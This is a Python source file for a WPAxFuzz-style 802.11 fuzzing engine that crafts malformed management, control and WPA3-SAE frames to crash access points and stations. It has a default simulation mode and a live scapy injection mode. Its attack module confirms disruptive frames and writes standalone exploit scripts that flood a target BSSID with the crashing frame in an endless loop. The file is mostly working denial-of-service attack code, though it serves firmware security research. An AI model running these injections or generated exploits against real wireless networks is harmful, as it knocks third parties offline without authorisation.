#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Airsniffer - Fuzzing DoS engine
================================

A WPAxFuzz-style 802.11 fuzzing DoS engine (Kampourakis et al., Cryptography
2022, doi:10.3390/cryptography6040053). It fuzzes IEEE 802.11 management,
control and WPA3-SAE frames to surface firmware DoS bugs in Access Points and
Stations - the class of DoS that keeps working against WPA3/PMF, unlike a plain
deauth attack.

Two execution modes:

  * simulate  (default) - crafts and *logs* every frame that WOULD be sent, runs
                          the batch / monitoring / attack-module logic end to end,
                          but transmits nothing. No hardware, root or scapy
                          needed. Safe for demos, teaching and CI.

  * live                - actually injects frames with scapy on a monitor-mode
                          interface. Linux + root + a capable adapter required.

AUTHORIZED USE ONLY. Only run live mode against networks you own or are
explicitly permitted to test.
"""

import argparse
import json
import os
import random
import sys
import time

# --------------------------------------------------------------------------- #
# 802.11 frame model (Tables 1 & 2 of the WPAxFuzz paper)
# --------------------------------------------------------------------------- #

# Dot11 management subtype ids (type = 0). deauth(12)/disassoc(10) are excluded
# on purpose - they are the classic deauth attack, not a fuzzing target.
MGMT_SUBTYPES = {
    "assoc_req":     0,
    "assoc_resp":    1,
    "reassoc_req":   2,
    "reassoc_resp":  3,
    "probe_req":     4,
    "probe_resp":    5,
    "beacon":        8,
    "auth":          11,
}

# Fields seeded per management subtype (payload / tagged params).
MGMT_FIELDS = {
    "beacon":       ["SSID", "SupportedRates", "ExtSupportedRates", "DSset",
                     "TIM", "RMEnabledCap", "HTCap", "HTInfo", "ExtCap", "RSN"],
    "probe_req":    ["SupportedRates", "ExtSupportedRates", "DSset", "HTCap", "RSN"],
    "probe_resp":   ["SSID", "SupportedRates", "ExtSupportedRates", "DSset",
                     "RMEnabledCap", "HTCap", "HTInfo", "ExtCap", "RSN"],
    "assoc_req":    ["SupportedRates", "ExtSupportedRates", "PowerCap",
                     "SupportedChannels", "RSN", "HTCap", "ExtCap"],
    "assoc_resp":   ["SupportedRates", "ExtSupportedRates", "HTCap", "HTInfo",
                     "OverlappingBSS", "ExtCap"],
    "reassoc_req":  ["CurrentAP", "SupportedRates", "ExtSupportedRates",
                     "PowerCap", "SupportedChannels", "RSN", "RMEnabledCap",
                     "HTCap", "ExtCap"],
    "reassoc_resp": ["SupportedRates", "ExtSupportedRates", "HTCap", "HTInfo",
                     "OverlappingBSS", "ExtCap", "RMEnabledCap"],
    "auth":         ["AuthAlgo", "AuthSeq", "StatusCode"],
}

# Control subtype ids (type = 1). A representative set from Table 2.
CONTROL_SUBTYPES = {
    "bar":     8,   # Block Ack Request
    "ba":      9,   # Block Ack
    "ps_poll": 10,
    "rts":     11,
    "cts":     12,
    "ack":     13,
    "cf_end":  14,
}

# Approximate standard byte-length per field (used by "standard" fuzz mode).
FIELD_STD_LEN = {
    "SSID": 32, "SupportedRates": 8, "ExtSupportedRates": 8, "DSset": 1,
    "TIM": 4, "RMEnabledCap": 5, "HTCap": 26, "HTInfo": 22, "ExtCap": 8,
    "RSN": 20, "PowerCap": 2, "SupportedChannels": 2, "OverlappingBSS": 14,
    "CurrentAP": 6, "AuthAlgo": 2, "AuthSeq": 2, "StatusCode": 2,
}

BATCH_SIZE = 128            # frames per batch (paper: 128, pairs identical)
DISTINCT_SEEDS = BATCH_SIZE // 2   # 64 distinct seeds per batch


# --------------------------------------------------------------------------- #
# Seed generation (stands in for the paper's "Blab" grammar generator)
# --------------------------------------------------------------------------- #

def make_seed(field, fuzz_mode):
    """Return random bytes for a field. standard = length per 802.11 spec,
    random = arbitrary length (may be shorter or far longer than the spec)."""
    if fuzz_mode == "standard":
        length = FIELD_STD_LEN.get(field, 8)
    else:
        length = random.randint(0, 255)
    return bytes(random.getrandbits(8) for _ in range(length))


# --------------------------------------------------------------------------- #
# Transmitter - simulation vs live (scapy)
# --------------------------------------------------------------------------- #

class Transmitter:
    def __init__(self, cfg):
        self.cfg = cfg
        self.sent = 0
        self.scapy = None
        if cfg["mode"] == "live":
            self._load_scapy()

    def _load_scapy(self):
        try:
            from scapy.all import RadioTap, Dot11, sendp  # noqa: F401
            self.scapy = sys.modules["scapy.all"]
        except Exception as exc:  # pragma: no cover - depends on host
            sys.exit("[!] live mode needs scapy (pip install scapy) and Linux "
                     "monitor mode. Import failed: %s" % exc)

    def send(self, ftype, subtype, field, seed, to_sta=False):
        """Transmit one frame (or log it, in simulation)."""
        cfg = self.cfg
        if to_sta:
            dst, src = cfg["sta_mac"], cfg["ap_mac"]
        else:
            dst, src = cfg["ap_mac"], cfg["sta_mac"]

        self.sent += 1
        if self.scapy is None:
            # Simulation: record intent, transmit nothing.
            return {
                "ftype": ftype, "subtype": subtype, "field": field,
                "dst": dst, "src": src, "bssid": cfg["ap_mac"],
                "seed_len": len(seed), "seed_hex": seed.hex()[:64],
            }

        # Live injection - mirrors the paper's Listing 1 exploit shape.
        S = self.scapy
        st = (MGMT_SUBTYPES.get(subtype) if ftype == 0
              else CONTROL_SUBTYPES.get(subtype, 0))
        frame = (S.RadioTap() /
                 S.Dot11(type=ftype, subtype=st, addr1=dst, addr2=src,
                         addr3=cfg["ap_mac"]) /
                 S.Raw(load=seed))
        S.sendp(frame, iface=cfg["iface"], count=1, verbose=0)
        return None


# --------------------------------------------------------------------------- #
# Monitoring (paper section 4.3) - detect connection disruption
# --------------------------------------------------------------------------- #

def check_disruption(cfg):
    """Return True if the target STA looks disrupted.

    live: ping the STA (a dead ping == the 'zombie'/disconnected state).
    simulate: randomly flag a disruption now and then so the pause/exclude and
    attack-module flow can be demonstrated deterministically."""
    if cfg["mode"] == "live":
        if not cfg.get("sta_ip"):
            return False
        pinger = "ping -c1 -W1 %s" % cfg["sta_ip"]
        return os.system(pinger + " >/dev/null 2>&1") != 0
    return random.random() < cfg["sim_disruption_rate"]


# --------------------------------------------------------------------------- #
# Fuzzing loops
# --------------------------------------------------------------------------- #

def log_event(cfg, event):
    with open(os.path.join(cfg["logdir"], "disruptions.jsonl"), "a",
              encoding="utf-8") as fh:
        fh.write(json.dumps(event) + "\n")


def fuzz_fields(cfg, tx, ftype, subtype, fields):
    """Fuzz each field of a subtype in 128-frame batches, pausing and excluding
    a field's category when a disruption is detected (paper section 4.1)."""
    excluded = set()
    disruptions = 0
    to_sta = cfg["target"] == "sta"

    for field in fields:
        if field in excluded:
            continue
        # One batch = 64 distinct seeds, each sent twice (paper's pairing).
        for _ in range(DISTINCT_SEEDS):
            seed = make_seed(field, cfg["fuzz_mode"])
            rec = None
            for _pair in range(2):
                rec = tx.send(ftype, subtype, field, seed, to_sta=to_sta)
            if check_disruption(cfg):
                disruptions += 1
                excluded.add(field)
                event = {
                    "ts": time.time(), "ftype": ftype, "subtype": subtype,
                    "field": field, "fuzz_mode": cfg["fuzz_mode"],
                }
                if rec:
                    event.update({"seed_hex": rec["seed_hex"],
                                  "seed_len": rec["seed_len"],
                                  "dst": rec["dst"], "src": rec["src"],
                                  "bssid": rec["bssid"]})
                log_event(cfg, event)
                print("  [!] disruption on %s/%s -> pausing, excluding field"
                      % (subtype, field))
                break
        else:
            print("  [*] fuzzed %s/%s (%d seeds, %d frames)"
                  % (subtype, field, DISTINCT_SEEDS, BATCH_SIZE))
    return disruptions


def run_management(cfg, tx):
    print("[+] Management-frame fuzzing (mode=%s, fuzz=%s)"
          % (cfg["mode"], cfg["fuzz_mode"]))
    subs = [cfg["frame"]] if cfg["frame"] in MGMT_SUBTYPES else MGMT_SUBTYPES
    total = 0
    for sub in subs:
        print("[>] subtype: %s" % sub)
        total += fuzz_fields(cfg, tx, 0, sub, MGMT_FIELDS[sub])
    return total


def run_control(cfg, tx):
    print("[+] Control-frame fuzzing (mode=%s)" % cfg["mode"])
    subs = [cfg["frame"]] if cfg["frame"] in CONTROL_SUBTYPES else CONTROL_SUBTYPES
    total = 0
    for sub in subs:
        print("[>] subtype: %s" % sub)
        # Three stages: frame-control flags, payload overflow, mixed.
        for stage in ("flags", "payload", "mixed"):
            total += fuzz_fields(cfg, tx, 1, sub, [stage])
    return total


def run_sae(cfg, tx):
    """WPA3-SAE Commit/Confirm fuzzing - the 7 stateless variants (section 4.4)."""
    print("[+] WPA3-SAE fuzzing (mode=%s) - Commit/Confirm variants" % cfg["mode"])
    variants = [
        "empty_auth",
        "commit+empty",
        "commit+confirm(sc=0)",
        "commit+confirm(sc=2)",
        "commit_only",
        "confirm(sc=0)",
        "confirm(sc=2)",
    ]
    total = 0
    burst = DISTINCT_SEEDS if cfg["burst"] else 4
    for v in variants:
        for _ in range(burst):
            seed = make_seed("StatusCode", cfg["fuzz_mode"])
            tx.send(0, "auth", "SAE:" + v, seed, to_sta=(cfg["target"] == "sta"))
        if check_disruption(cfg):
            total += 1
            log_event(cfg, {"ts": time.time(), "ftype": 0, "subtype": "auth",
                            "field": "SAE:" + v, "fuzz_mode": cfg["fuzz_mode"]})
            print("  [!] SAE disruption on variant %s" % v)
        else:
            print("  [*] SAE variant %s sent (%d frames)" % (v, burst))
    return total


# --------------------------------------------------------------------------- #
# Attack module (paper section 5) - replay + auto-generate exploit
# --------------------------------------------------------------------------- #

EXPLOIT_TEMPLATE = '''#!/usr/bin/env python3
# Auto-generated by Airsniffer Fuzzing DoS (WPAxFuzz-style attack module)
# Reproduces a DoS against {bssid} via a malformed {subtype}/{field} frame.
# AUTHORIZED USE ONLY.
from scapy.all import Dot11, RadioTap, Raw, sendp

dot11 = Dot11(type={ftype}, subtype={subtype_id}, addr1="{dst}",
              addr2="{src}", addr3="{bssid}")
payload = bytes.fromhex("{seed_hex}")
frame = RadioTap() / dot11 / Raw(load=payload)

print("- - - - - - - - - - - - - - - -")
print("Testing the exploit against {bssid}")
print("- - - - - - - - - - - - - - - -")
while True:
    sendp(frame, count=1, iface="{iface}", verbose=0)
'''


def run_attack_module(cfg, tx):
    """Replay logged disruptive frames to confirm true positives, then write a
    standalone scapy exploit for each confirmed one. SAE is excluded (per paper)."""
    logpath = os.path.join(cfg["logdir"], "disruptions.jsonl")
    if not os.path.isfile(logpath):
        print("[!] no disruptions log found (%s). Run a fuzz pass first." % logpath)
        return 0

    confirmed = 0
    with open(logpath, encoding="utf-8") as fh:
        entries = [json.loads(line) for line in fh if line.strip()]

    print("[+] Attack module: %d logged disruption(s) to verify" % len(entries))
    for e in entries:
        field = e.get("field", "")
        if field.startswith("SAE:"):
            print("  [-] skipping SAE entry (attack module excludes SAE): %s" % field)
            continue

        subtype = e["subtype"]
        # Replay to confirm the frame really reproduces the DoS.
        seed_hex = e.get("seed_hex", "")
        seed = bytes.fromhex(seed_hex) if seed_hex else make_seed(field, "random")
        tx.send(e["ftype"], subtype, field, seed,
                to_sta=(cfg["target"] == "sta"))

        # In simulation we treat replays as confirmed; live would re-check ping.
        reproduced = True if cfg["mode"] == "simulate" else check_disruption(cfg)
        if not reproduced:
            print("  [~] %s/%s did not reproduce (unstable)" % (subtype, field))
            continue

        confirmed += 1
        st = (MGMT_SUBTYPES.get(subtype, 0) if e["ftype"] == 0
              else CONTROL_SUBTYPES.get(subtype, 0))
        exploit = EXPLOIT_TEMPLATE.format(
            bssid=e.get("bssid", cfg["ap_mac"]), subtype=subtype, field=field,
            ftype=e["ftype"], subtype_id=st, dst=e.get("dst", cfg["sta_mac"]),
            src=e.get("src", cfg["ap_mac"]), seed_hex=seed_hex or seed.hex(),
            iface=cfg["iface"])
        outname = "exploit_%s_%s.py" % (subtype, field.replace(":", "_"))
        outpath = os.path.join(cfg["logdir"], outname)
        with open(outpath, "w", encoding="utf-8") as ofh:
            ofh.write(exploit)
        print("  [+] confirmed %s/%s -> exploit written: %s"
              % (subtype, field, outpath))
    print("[=] attack module done: %d exploit(s) generated" % confirmed)
    return confirmed


# --------------------------------------------------------------------------- #
# CLI
# --------------------------------------------------------------------------- #

def parse_args(argv):
    p = argparse.ArgumentParser(description="Airsniffer Fuzzing DoS engine "
                                            "(WPAxFuzz-style).")
    p.add_argument("--attack", required=True,
                   choices=["mgmt", "control", "sae", "attack-module"],
                   help="which module to run")
    p.add_argument("--mode", default="simulate",
                   choices=["simulate", "live"],
                   help="simulate (default, safe) or live (real injection)")
    p.add_argument("--fuzz-mode", default="random",
                   choices=["standard", "random"])
    p.add_argument("--frame", default="all",
                   help="specific subtype (e.g. beacon, rts) or 'all'")
    p.add_argument("--target", default="ap", choices=["ap", "sta"],
                   help="fuzz the AP, or impersonate the AP toward the STA")
    p.add_argument("--iface", default="wlan0mon")
    p.add_argument("--ap-mac", default="AA:AA:AA:AA:AA:AA")
    p.add_argument("--sta-mac", default="BB:BB:BB:BB:BB:BB")
    p.add_argument("--sta-ip", default="")
    p.add_argument("--ssid", default="TARGET_SSID")
    p.add_argument("--channel", default="1")
    p.add_argument("--burst", action="store_true", help="SAE burst mode (128)")
    p.add_argument("--logdir", default=".")
    p.add_argument("--sim-disruption-rate", type=float, default=0.15,
                   help="simulation: probability a batch flags a disruption")
    p.add_argument("--seed", type=int, default=None,
                   help="RNG seed for reproducible simulation runs")
    return p.parse_args(argv)


def main(argv=None):
    args = parse_args(sys.argv[1:] if argv is None else argv)
    if args.seed is not None:
        random.seed(args.seed)
    os.makedirs(args.logdir, exist_ok=True)

    cfg = {
        "mode": args.mode, "fuzz_mode": args.fuzz_mode, "frame": args.frame,
        "target": args.target, "iface": args.iface, "ap_mac": args.ap_mac,
        "sta_mac": args.sta_mac, "sta_ip": args.sta_ip, "ssid": args.ssid,
        "channel": args.channel, "burst": args.burst, "logdir": args.logdir,
        "sim_disruption_rate": args.sim_disruption_rate,
    }

    banner = "SIMULATION (no frames transmitted)" if args.mode == "simulate" \
        else "LIVE INJECTION"
    print("=" * 60)
    print(" Airsniffer Fuzzing DoS engine - %s" % banner)
    print(" target AP %s (%s) ch %s  iface %s"
          % (cfg["ssid"], cfg["ap_mac"], cfg["channel"], cfg["iface"]))
    print("=" * 60)

    tx = Transmitter(cfg)
    dispatch = {
        "mgmt": run_management,
        "control": run_control,
        "sae": run_sae,
        "attack-module": run_attack_module,
    }
    result = dispatch[args.attack](cfg, tx)

    print("-" * 60)
    print("[=] done. frames %s: %d | events/exploits: %s"
          % ("logged" if args.mode == "simulate" else "sent",
             tx.sent, result))
    if args.mode == "simulate":
        print("[i] simulation only - nothing was actually transmitted.")
    return 0


if __name__ == "__main__":
    sys.exit(main())
